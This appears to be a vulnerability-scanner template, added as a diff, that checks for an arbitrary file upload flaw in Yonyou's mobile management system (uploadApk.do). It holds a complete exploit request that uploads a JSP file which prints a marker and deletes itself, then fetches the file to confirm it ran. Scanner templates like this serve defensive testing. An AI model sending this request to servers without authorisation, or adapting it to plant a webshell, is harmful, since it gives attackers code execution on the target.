@@ -1,0 +1,43 @@
+id: yonyou-mobile-uploadapk-fileupload
+
+info:
+  name: 用友 移动管理系统 uploadApk.do 任意文件上传
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |
+    用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限
+    app="用友-移动系统管理"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20uploadApk.do%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  tags: yonyou,fileupload
+  created: 2023/08/09
+
+set:
+  r1: randomLowercase(4)
+  r2: randomInt(40000, 44800)
+  r3: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /maportal/appmanager/uploadApk.do?pk_obj=
+      headers: 
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+          ------WebKitFormBoundary{{rboundary}}\r\n\
+          Content-Disposition: form-data; name=\"downloadpath\"; filename=\"{{r1}}.jsp\"\r\n\
+          Content-Type: application/msword\r\n\
+          \r\n\
+          <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+          \r\n\
+          ------WebKitFormBoundary{{rboundary}}--\r\n\
+          "
+    expression: response.status == 200 && response.body.bcontains(b'"status":') 
+  r1:
+    request:
+      method: GET
+      path: /maupload/apk/{{r1}}.jsp
+    expression: response.status == 200  && response.body.bcontains(bytes(string(r2 * r3)))
+expression: r0() && r1()
